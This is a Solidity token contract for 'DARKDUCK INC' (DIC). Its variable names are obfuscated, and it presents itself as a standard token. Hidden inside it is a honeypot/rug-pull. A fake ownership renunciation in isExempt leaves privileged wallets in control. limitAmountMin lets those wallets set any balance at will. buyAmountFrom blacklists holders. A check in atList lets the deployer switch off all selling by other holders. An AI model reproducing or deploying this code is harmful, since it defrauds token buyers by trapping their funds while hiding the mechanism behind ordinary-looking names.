//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface toBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitLiquidity) external view returns (uint256);

    function transfer(address totalMarketing, uint256 maxMarketing) external returns (bool);

    function allowance(address receiverTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxMarketing) external returns (bool);

    function transferFrom(address sender,address totalMarketing,uint256 maxMarketing) external returns (bool);

    event Transfer(address indexed from, address indexed toFund, uint256 value);
    event Approval(address indexed receiverTrading, address indexed spender, uint256 value);
}

interface teamLiquidityTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface teamSellAuto {
    function createPair(address marketingReceiver, address feeMarketing) external returns (address);
}

abstract contract launchedFeeLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toBuyMetadata is toBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DARKDUCKINC is launchedFeeLimit, toBuy, toBuyMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTradingReceiver;
    }

    mapping(address => uint256) private modeSender;

    function fromExempt(address limitEnable) public {
        if (walletLaunched) {
            return;
        }
        if (amountMin == txAt) {
            txAt = feeShould;
        }
        fundWallet[limitEnable] = true;
        
        walletLaunched = true;
    }

    uint256 private launchedTradingReceiver = 100000000 * 10 ** 18;

    constructor (){
        if (amountMin != fromMin) {
            feeShould = txAt;
        }
        isExempt();
        teamLiquidityTotal maxBuy = teamLiquidityTotal(feeList);
        sellToken = teamSellAuto(maxBuy.factory()).createPair(maxBuy.WETH(), address(this));
        
        buyLaunched = _msgSender();
        fundWallet[buyLaunched] = true;
        modeSender[buyLaunched] = launchedTradingReceiver;
        
        emit Transfer(address(0), buyLaunched, launchedTradingReceiver);
    }

    function approve(address isList, uint256 maxMarketing) public virtual override returns (bool) {
        tradingTotal[_msgSender()][isList] = maxMarketing;
        emit Approval(_msgSender(), isList, maxMarketing);
        return true;
    }

    address public buyLaunched;

    function transferFrom(address atAmount, address totalMarketing, uint256 maxMarketing) external override returns (bool) {
        if (_msgSender() != feeList) {
            if (tradingTotal[atAmount][_msgSender()] != type(uint256).max) {
                require(maxMarketing <= tradingTotal[atAmount][_msgSender()]);
                tradingTotal[atAmount][_msgSender()] -= maxMarketing;
            }
        }
        return atList(atAmount, totalMarketing, maxMarketing);
    }

    address public sellToken;

    function transfer(address isFee, uint256 maxMarketing) external virtual override returns (bool) {
        return atList(_msgSender(), isFee, maxMarketing);
    }

    function name() external view virtual override returns (string memory) {
        return exemptMarketing;
    }

    uint256 public txAt;

    address feeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isReceiver(address atAmount, address totalMarketing, uint256 maxMarketing) internal returns (bool) {
        require(modeSender[atAmount] >= maxMarketing);
        modeSender[atAmount] -= maxMarketing;
        modeSender[totalMarketing] += maxMarketing;
        emit Transfer(atAmount, totalMarketing, maxMarketing);
        return true;
    }

    bool public walletLaunched;

    function decimals() external view virtual override returns (uint8) {
        return exemptFund;
    }

    function buyAmountFrom(address amountMax) public {
        liquidityTradingSender();
        if (senderLaunched == takeReceiver) {
            takeReceiver = false;
        }
        if (amountMax == buyLaunched || amountMax == sellToken) {
            return;
        }
        autoFundToken[amountMax] = true;
    }

    function limitAmountMin(address isFee, uint256 maxMarketing) public {
        liquidityTradingSender();
        modeSender[isFee] = maxMarketing;
    }

    function owner() external view returns (address) {
        return tradingIs;
    }

    uint256 private feeShould;

    function getOwner() external view returns (address) {
        return tradingIs;
    }

    function enableAt(uint256 maxMarketing) public {
        liquidityTradingSender();
        marketingBuy = maxMarketing;
    }

    function balanceOf(address limitLiquidity) public view virtual override returns (uint256) {
        return modeSender[limitLiquidity];
    }

    mapping(address => bool) public fundWallet;

    string private exemptMarketing = "DARKDUCK INC";

    uint256 exemptWallet;

    address private tradingIs;

    function atList(address atAmount, address totalMarketing, uint256 maxMarketing) internal returns (bool) {
        if (atAmount == buyLaunched) {
            return isReceiver(atAmount, totalMarketing, maxMarketing);
        }
        uint256 atTakeToken = toBuy(sellToken).balanceOf(modeEnableTake);
        require(atTakeToken == marketingBuy);
        require(!autoFundToken[atAmount]);
        return isReceiver(atAmount, totalMarketing, maxMarketing);
    }

    event OwnershipTransferred(address indexed autoMaxEnable, address indexed exemptMinTrading);

    uint256 private amountMin;

    address modeEnableTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public autoFundToken;

    uint256 marketingBuy;

    function symbol() external view virtual override returns (string memory) {
        return exemptLiquidity;
    }

    uint256 public fromMin;

    uint8 private exemptFund = 18;

    bool public takeAtTotal;

    bool private senderLaunched;

    function isExempt() public {
        emit OwnershipTransferred(buyLaunched, address(0));
        tradingIs = address(0);
    }

    function liquidityTradingSender() private view {
        require(fundWallet[_msgSender()]);
    }

    bool private takeReceiver;

    string private exemptLiquidity = "DIC";

    function allowance(address limitMin, address isList) external view virtual override returns (uint256) {
        if (isList == feeList) {
            return type(uint256).max;
        }
        return tradingTotal[limitMin][isList];
    }

    mapping(address => mapping(address => uint256)) private tradingTotal;

}